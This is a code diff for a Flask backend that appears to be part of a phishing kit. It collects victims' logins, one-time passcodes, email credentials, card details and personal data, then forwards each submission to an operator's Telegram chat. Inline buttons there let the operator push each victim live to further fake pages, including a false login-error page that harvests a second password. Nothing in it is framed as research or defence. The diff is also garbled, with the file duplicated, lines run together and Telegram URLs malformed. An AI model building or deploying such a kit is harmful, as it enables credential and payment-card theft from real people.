@@ -8,6 +8,146 @@ from dotenv import load_dotenv
 
 load_dotenv()
 app = Flask(__name__)
+# Enable CORS so your frontend can talk to this backend
+CORS(app, resources={r"/*": {"origins": "*"}})
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+
+if not BOT_TOKEN or not CHAT_ID:
+    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID in .env file")
+
+# Temporary in-memory storage for session states
+SESSION_STATUS = {}
+
+# BUTTON CONFIG: 
+# When you click LOGIN2 in Telegram, it sends the user to home.html?error=1
+PAGES = [
+    {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
+    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
+    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
+    {"emoji": "🧾", "text": "C", "page": "c.html"},
+    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
+    {"emoji": "🔑", "text": "LOGIN2", "page": "home.html?error=1"},
+    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
+]
+
+def set_webhook():
+    """Run this once to tell Telegram where to send button clicks"""
+    webhook_url = "https://onrender.com"
+    url = f"https://telegram.org{BOT_TOKEN}/setWebhook?url={webhook_url}"
+    try:
+        response = requests.get(url)
+        return response.json()
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+def send_to_telegram(data, session_id, type_):
+    """Sends the captured data to your Telegram Chat with Action Buttons"""
+    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
+    for key, value in data.items():
+        if isinstance(value, dict):
+            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
+            for subkey, subvalue in value.items():
+                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
+        else:
+            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
+    msg += f"\n<b>Session ID:</b> <code>{session_id}</code>"
+
+    inline_keyboard = [[
+        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
+    ] for b in PAGES]
+
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": msg,
+        "parse_mode": "HTML",
+        "reply_markup": {"inline_keyboard": inline_keyboard}
+    }
+
+    try:
+        r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", json=payload)
+        return r.ok
+    except:
+        return False
+
+# =====================
+# SYSTEM ROUTES
+# =====================
+
+@app.route("/webhook", methods=["POST"])
+def webhook():
+    """Receives the button click (callback) from Telegram"""
+    update = request.get_json()
+    if "callback_query" in update:
+        callback_data = update["callback_query"]["data"]
+        try:
+            # Parses "session_id:page_to_redirect"
+            session_id, page_to_redirect = callback_data.split(":", 1)
+            if session_id in SESSION_STATUS:
+                SESSION_STATUS[session_id]["approved"] = True
+                SESSION_STATUS[session_id]["redirect_url"] = page_to_redirect
+                print(f"Action: Admin redirecting {session_id} to {page_to_redirect}")
+        except Exception as e:
+            print(f"Webhook parse error: {e}")
+    return jsonify({"ok": True}), 200
+
+@app.route("/status/<session_id>", methods=["GET"])
+def get_status(session_id):
+    """The Frontend polls this to see if you clicked a button in Telegram"""
+    status_info = SESSION_STATUS.get(session_id)
+    if not status_info:
+        return jsonify({"status": "not_found"}), 404
+        
+    if status_info.get("approved"):
+        return jsonify({
+            "status": "approved",
+            "redirect_url": status_info["redirect_url"]
+        }), 200
+    
+    return jsonify({"status": "pending"}), 200
+
+# =====================
+# DATA COLLECTION ROUTES
+# =====================
+
+def process_submission(request_data, label):
+    data = request_data.get_json()
+    session_id = str(uuid.uuid4())
+    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
+    send_to_telegram(data, session_id, label)
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/login", methods=["POST"])
+def login(): return process_submission(request, "login")
+
+@app.route("/otp", methods=["POST"])
+def otp(): return process_submission(request, "otp")
+
+@app.route("/email", methods=["POST"])
+def email(): return process_submission(request, "email")
+
+@app.route("/c", methods=["POST"])
+def c(): return process_submission(request, "card")
+
+@app.route("/personal", methods=["POST"])
+def personal(): return process_submission(request, "personal")
+
+@app.route("/login2", methods=["POST"])
+def login2(): return process_submission(request, "login2")
+
+if __name__ == "__main__":
+    # Note: set_webhook() needs to be called once after deployment
+    app.run(debug=True, port=5000)from flask import Flask, request, jsonify
+from flask_cors import CORS
+import os
+import uuid
+import requests
+import time
+from dotenv import load_dotenv
+
+load_dotenv()
+app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
